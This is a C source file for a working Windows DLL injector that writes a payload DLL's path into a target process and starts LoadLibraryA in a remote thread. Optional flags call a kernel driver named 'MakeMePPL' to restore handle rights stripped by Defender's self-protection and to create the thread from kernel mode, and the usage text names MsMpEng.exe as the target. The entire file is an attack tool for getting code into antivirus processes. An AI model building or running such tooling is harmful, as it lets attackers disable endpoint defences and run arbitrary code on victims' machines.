/*
 * injector.c -- classic "LoadLibrary" DLL injector.
 *
 * Steps performed against the target process:
 *   1. OpenProcess(PROCESS_ALL_ACCESS)
 *   2. VirtualAllocEx  -> reserve RWX memory for the DLL path string
 *   3. WriteProcessMemory -> copy the full path of the DLL into it
 *   4. GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA")
 *   5. CreateRemoteThread(LoadLibraryA, remotePath)
 *   6. WaitForSingleObject + GetExitCodeThread -> the HMODULE the loader
 *      returned (0 / NULL means the load failed)
 *   7. VirtualFreeEx(MEM_RELEASE) -> cleanup
 *
 * Build (x64, VS2022):
 *     cl /nologo /O2 /W4 /Fe:injector.exe injector.c
 *
 * Usage:
 *     injector.exe <pid> <full\path\to\payload.dll>
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * MakeMePPL control interface. Only the handle-access repair operation is
 * duplicated here so dll_load stays self-contained. It is the same IOCTL the
 * kernel module publishes in ppl_executor/shared/PplIoctl.h.
 */
#define PPL_WIN32_DEVICE L"\\\\.\\MakeMePPL"
#define PPL_IOCTL_FIX_HANDLE_ACCESS \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PPL_IOCTL_CREATE_REMOTE_THREAD \
    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PPL_HANDLE_FIX_REQUEST {
    ULONG   ProcessId;
    ULONG   AccessMask;
    ULONG64 HandleValue;
    ULONG   Reserved;
    ULONG   Reserved2;
} PPL_HANDLE_FIX_REQUEST;

typedef struct _PPL_HANDLE_FIX_RESULT {
    LONG    Status;
    ULONG   OldGrantedAccess;
    ULONG   NewGrantedAccess;
    ULONG64 ObjectPointer;
    ULONG   Reserved;
} PPL_HANDLE_FIX_RESULT;

typedef struct _PPL_REMOTE_THREAD_REQUEST {
    ULONG   ProcessId;
    ULONG   Flags;
    ULONG64 ProcessHandle;
    ULONG64 StartAddress;
    ULONG64 Parameter;
    ULONG   Reserved;
    ULONG   Reserved2;
} PPL_REMOTE_THREAD_REQUEST;

typedef struct _PPL_REMOTE_THREAD_RESULT {
    LONG    Status;
    ULONG   ThreadId;
    ULONG   Flags;
    ULONG   Reserved;
} PPL_REMOTE_THREAD_RESULT;

/* OpenProcessToken / AdjustTokenPrivileges / LookupPrivilegeValueA */
#pragma comment(lib, "advapi32.lib")

/* ------------------------------------------------------------------ */
/* small helpers                                                       */
/* ------------------------------------------------------------------ */

static void PrintLastError(const char *what)
{
    DWORD err = GetLastError();
    char  msg[512] = { 0 };

    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                   msg, (DWORD)sizeof(msg), NULL);

    /* strip trailing CR/LF that FormatMessage likes to append */
    while (msg[0] != '\0') {
        size_t n = strlen(msg);
        if (n == 0)
            break;
        if (msg[n - 1] == '\r' || msg[n - 1] == '\n')
            msg[n - 1] = '\0';
        else
            break;
    }

    fprintf(stderr, "[-] %s failed (error %lu): %s\n", what, (unsigned long)err, msg);
}

static BOOL EnableDebugPrivilege(void)
{
    HANDLE           token = NULL;
    TOKEN_PRIVILEGES tp;
    LUID             luid;
    BOOL             ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return FALSE;

    if (LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
        if (ok && GetLastError() == ERROR_NOT_ALL_ASSIGNED)
            ok = FALSE;   /* privilege not held by this account */
    }

    CloseHandle(token);
    return ok;
}

/* ------------------------------------------------------------------ */
/* the actual injection                                                */
/* ------------------------------------------------------------------ */

/*
 * Defender self-protection silently removes PROCESS_VM_WRITE,
 * PROCESS_VM_OPERATION and PROCESS_CREATE_THREAD from our handle when the
 * open succeeds. MakeMePPL restores GrantedAccess in this process's handle
 * table; the ObRegisterCallbacks routine does not run again for an existing
 * handle.
 */
static BOOL FixHandleAccess(HANDLE hProcess, DWORD targetPid)
{
    HANDLE                  device;
    PPL_HANDLE_FIX_REQUEST  request;
    PPL_HANDLE_FIX_RESULT   result;
    DWORD                   returned = 0;
    BOOL                    ok;

    device = CreateFileW(PPL_WIN32_DEVICE,
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        PrintLastError("CreateFile(MakeMePPL)");
        fprintf(stderr, "    (is the MakeMePPL driver loaded?)\n");
        return FALSE;
    }

    ZeroMemory(&request, sizeof(request));
    request.ProcessId   = targetPid;
    request.AccessMask  = PROCESS_ALL_ACCESS;
    request.HandleValue = (ULONG64)(ULONG_PTR)hProcess;

    ZeroMemory(&result, sizeof(result));
    ok = DeviceIoControl(device, PPL_IOCTL_FIX_HANDLE_ACCESS,
                         &request, sizeof(request),
                         &result, sizeof(result), &returned, NULL);

    if (!ok) {
        PrintLastError("DeviceIoControl(fix handle)");
        CloseHandle(device);
        return FALSE;
    }

    printf("[*] handle access repair: 0x%08lX -> 0x%08lX (status 0x%08lX)\n",
           (unsigned long)result.OldGrantedAccess,
           (unsigned long)result.NewGrantedAccess,
           (unsigned long)result.Status);

    CloseHandle(device);

    return result.Status == 0 && result.NewGrantedAccess == request.AccessMask;
}

/*
 * Kernel-side alternative to CreateRemoteThread. NtCreateThreadEx performs a
 * protected-process compatibility check in user mode, so even a PPL injector
 * with PROCESS_CREATE_THREAD is refused by MsMpEng. The driver calls the
 * exported RtlCreateUserThread from kernel mode, where that check does not
 * apply.
 */
static BOOL CreateThreadKernel(HANDLE hProcess, DWORD targetPid,
                               PVOID startAddress, PVOID parameter)
{
    HANDLE                      device;
    PPL_REMOTE_THREAD_REQUEST   request;
    PPL_REMOTE_THREAD_RESULT    result;
    DWORD                       returned = 0;
    BOOL                        ok;

    device = CreateFileW(PPL_WIN32_DEVICE,
                         GENERIC_READ | GENERIC_WRITE,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        PrintLastError("CreateFile(MakeMePPL)");
        fprintf(stderr, "    (is the MakeMePPL driver loaded?)\n");
        return FALSE;
    }

    ZeroMemory(&request, sizeof(request));
    request.ProcessId     = targetPid;
    request.ProcessHandle = (ULONG64)(ULONG_PTR)hProcess;
    request.StartAddress  = (ULONG64)(ULONG_PTR)startAddress;
    request.Parameter     = (ULONG64)(ULONG_PTR)parameter;

    ZeroMemory(&result, sizeof(result));
    ok = DeviceIoControl(device, PPL_IOCTL_CREATE_REMOTE_THREAD,
                         &request, sizeof(request),
                         &result, sizeof(result), &returned, NULL);
    if (!ok) {
        PrintLastError("DeviceIoControl(create thread)");
        CloseHandle(device);
        return FALSE;
    }

    printf("[*] kernel thread: status 0x%08lX tid=%lu\n",
           (unsigned long)result.Status, (unsigned long)result.ThreadId);

    CloseHandle(device);
    return result.Status == 0;
}

static int InjectDll(DWORD pid, const char *dllPath,
                     BOOL fixHandle, BOOL kernelThread)
{
    HANDLE hProcess        = NULL;
    HANDLE hThread         = NULL;
    LPVOID remoteBuffer    = NULL;
    HMODULE hKernel32      = NULL;
    FARPROC pLoadLibraryA  = NULL;
    SIZE_T  pathLen        = strlen(dllPath) + 1;   /* include NUL */
    DWORD   exitCode       = 0;
    int     result         = 1;

    printf("[*] target pid      : %lu\n", (unsigned long)pid);
    printf("[*] dll to inject   : %s\n", dllPath);

    /* 1. open the target ------------------------------------------------ */
    hProcess = OpenProcess(PROCESS_CREATE_THREAD     |
                           PROCESS_QUERY_INFORMATION  |
                           PROCESS_VM_OPERATION       |
                           PROCESS_VM_WRITE           |
                           PROCESS_VM_READ,
                           FALSE, pid);
    if (hProcess == NULL) {
        PrintLastError("OpenProcess");
        fprintf(stderr, "    (try running the injector as Administrator)\n");
        goto cleanup;
    }
    printf("[+] OpenProcess ok\n");

    /* 1b. undo access stripping by a protection callback, if requested --- */
    if (fixHandle) {
        if (!FixHandleAccess(hProcess, pid)) {
            fprintf(stderr, "[-] could not restore handle access\n");
            goto cleanup;
        }
    }

    /* 2. reserve memory in the target ----------------------------------- */
    remoteBuffer = VirtualAllocEx(hProcess, NULL, pathLen,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        PrintLastError("VirtualAllocEx");
        goto cleanup;
    }
    printf("[+] VirtualAllocEx ok  (remote buffer @ 0x%p, %zu bytes)\n",
           remoteBuffer, pathLen);

    /* 3. write the DLL path into the target ----------------------------- */
    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, pathLen, NULL)) {
        PrintLastError("WriteProcessMemory");
        goto cleanup;
    }
    printf("[+] WriteProcessMemory ok\n");

    /* 4. resolve LoadLibraryA ------------------------------------------- */
    hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        PrintLastError("GetModuleHandleA(kernel32.dll)");
        goto cleanup;
    }

    pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        PrintLastError("GetProcAddress(LoadLibraryA)");
        goto cleanup;
    }
    printf("[+] LoadLibraryA @ 0x%p\n", (void *)pLoadLibraryA);

    /* 5. run it in a remote thread -------------------------------------- */
    if (kernelThread) {
        if (!CreateThreadKernel(hProcess, pid,
                                (PVOID)pLoadLibraryA, remoteBuffer))
            goto cleanup;
        printf("[+] kernel-created thread dispatched; waiting 3s\n");
        Sleep(3000);
        printf("[+] injection thread dispatched (verify the payload marker)\n");
        result = 0;
        goto cleanup;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)pLoadLibraryA,
                                 remoteBuffer, 0, NULL);
    if (hThread == NULL) {
        PrintLastError("CreateRemoteThread");
        goto cleanup;
    }
    printf("[+] CreateRemoteThread ok\n");

    /* 6. wait and read the returned HMODULE ----------------------------- */
    if (WaitForSingleObject(hThread, 10000) != WAIT_OBJECT_0) {
        PrintLastError("WaitForSingleObject");
        goto cleanup;
    }

    if (!GetExitCodeThread(hThread, &exitCode)) {
        PrintLastError("GetExitCodeThread");
        goto cleanup;
    }

    if (exitCode == 0) {
        fprintf(stderr, "[-] LoadLibraryA returned NULL inside the target "
                        "(DLL failed to load)\n");
        goto cleanup;
    }

    printf("[+] LoadLibraryA returned HMODULE 0x%p\n", (void *)(uintptr_t)exitCode);
    printf("[+] injection succeeded\n");
    result = 0;

cleanup:
    /* 7. cleanup -------------------------------------------------------- */
    if (remoteBuffer != NULL)
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    if (hThread != NULL)
        CloseHandle(hThread);
    if (hProcess != NULL)
        CloseHandle(hProcess);

    return result;
}

/* ------------------------------------------------------------------ */

static void Usage(const char *exe)
{
    fprintf(stderr,
            "usage: %s <pid> <full\\path\\to\\payload.dll> "
            "[--fix-handle] [--kernel-thread]\n"
            "  --fix-handle     restore access stripped by a protection callback\n"
            "  --kernel-thread  create the remote thread through MakeMePPL\n"
            "                   (bypasses the user-mode PPL thread-creation check)\n"
            "  both flags require the MakeMePPL driver; used for MsMpEng.exe\n"
            "  e.g. %s 1234 C:\\Data\\defender-2026-autumn\\dll_load\\build\\payload.dll\n",
            exe, exe);
}

int main(int argc, char **argv)
{
    char  fullPath[MAX_PATH];
    DWORD pid;
    BOOL  fixHandle = FALSE;
    BOOL  kernelThread = FALSE;
    int   i;

    if (argc < 3) {
        Usage(argv[0]);
        return 2;
    }

    for (i = 3; i < argc; ++i) {
        if (strcmp(argv[i], "--fix-handle") == 0) {
            fixHandle = TRUE;
        } else if (strcmp(argv[i], "--kernel-thread") == 0) {
            kernelThread = TRUE;
        } else {
            fprintf(stderr, "[-] unknown option: %s\n", argv[i]);
            Usage(argv[0]);
            return 2;
        }
    }

    pid = (DWORD)strtoul(argv[1], NULL, 10);
    if (pid == 0) {
        fprintf(stderr, "[-] invalid pid: %s\n", argv[1]);
        return 2;
    }

    /* LoadLibraryA needs an absolute path, so normalise it. */
    if (GetFullPathNameA(argv[2], MAX_PATH, fullPath, NULL) == 0) {
        PrintLastError("GetFullPathNameA");
        return 2;
    }

    if (GetFileAttributesA(fullPath) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[-] dll not found: %s\n", fullPath);
        return 2;
    }

    if (!EnableDebugPrivilege())
        fprintf(stderr, "[!] could not enable SeDebugPrivilege "
                        "(continuing anyway)\n");

    return InjectDll(pid, fullPath, fixHandle, kernelThread);
}
